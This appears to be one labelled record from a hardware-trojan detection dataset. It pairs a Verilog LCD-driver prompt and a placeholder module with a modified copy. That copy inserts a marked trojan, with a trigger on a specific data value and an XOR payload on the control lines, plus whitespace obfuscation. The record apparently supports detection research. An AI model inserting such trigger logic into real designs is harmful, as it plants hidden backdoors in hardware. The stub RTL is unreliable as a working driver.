@@ -1,0 +1,20 @@
+{
+    "sample_id": "SRTL_555",
+    "instruction": "Please act as a professional Verilog designer. Your task is to create a Verilog module that implements an LCD driver. \nAn LCD driver is a type of digital circuit that drives an LCD (liquid crystal display). \nThe inputs to the circuit are connected to a set of data lines, and the outputs are connected to a set of control lines. \nThe control lines are used to control the operation of the LCD, such as selecting the display mode or turning on and off the display.\nYour module should have the following inputs and outputs:\n\nInputs: a set of n data signals (data1, data2, ..., datan)\nOutputs: a set of m control signals (ctrl1, ctrl2, ..., ctrlm)\nThe module should also have the following parameters:\n\nn: the number of data signals\nm: the number of control signals\nYour module should implement the following functionality:\n\nThe circuit should be able to write data to the LCD.\nThe circuit should be able to read data from the LCD.\nThe circuit should be able to control the operation of the LCD, such as selecting the display mode or turning on and off the display.\nTo implement the LCD driver, you should use Verilog code to define the control signals as Boolean functions of the input signals. \nYou should then use these functions to connect the inputs to the control lines and control the operation of the LCD. \nYou should also use the data signals to write data to the LCD and read data from the LCD.",
+    "original_rtl": "module LCD_driver (\n  input [n-1:0] data,\n  output [m-1:0] ctrl\n);\n\nparameter n = 8; // number of data signals\nparameter m = 3; // number of control signals\n\n// Define control signals as Boolean functions of the input signals\nassign ctrl[0] = data[0] & data[1]; // Control signal 1\nassign ctrl[1] = data[2] | data[3]; // Control signal 2\nassign ctrl[2] = data[4] ^ data[5]; // Control signal 3\n\n// Write data to the LCD\nalways @(posedge ctrl[0]) begin\n  // Write data to the LCD\nend\n\n// Read data from the LCD\nalways @(posedge ctrl[1]) begin\n  // Read data from the LCD\nend\n\n// Control the operation of the LCD\nalways @(posedge ctrl[2]) begin\n  // Control the operation of the LCD\nend\n\nendmodule",
+    "modified_rtl": "    module LCD_driver (\n    input [n-1:0] data,\n    output [m-1:0] ctrl\n);\n\n    parameter n = 8; // number of data signals\n    parameter m = 3; // number of control signals\n\n    // Define control signals as Boolean functions of the input signals\n    assign ctrl[0] = data[0] & data[1]; // Control signal 1\n    assign ctrl[1] = data[2] | data[3]; // Control signal 2\n    assign ctrl[2] = data[4] ^ data[5]; // Control signal 3\n\n    // Write data to the LCD\n    always @(posedge ctrl[0]) begin\n    // Write data to the LCD\nend\n\n    // Read data from the LCD\n    always @(posedge ctrl[1]) begin\n    // Read data from the LCD\nend\n\n    // Control the operation of the LCD\n    always @(posedge ctrl[2]) begin\n    // Control the operation of the LCD\nend\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [7:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (data == 8'h01);\n    htrojan_pay = htrojan_trig ? (ctrl ^ 8'h01) : ctrl;\nend\n// HT_END\nendmodule",
+    "source_index": 555,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "data"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "ctrl"
+    ],
+    "obfuscation_applied": true,
+    "obfuscation_type": "Formatting_Normalization_and_Whitespace_Restructuring",
+    "syntax_valid": true
+}
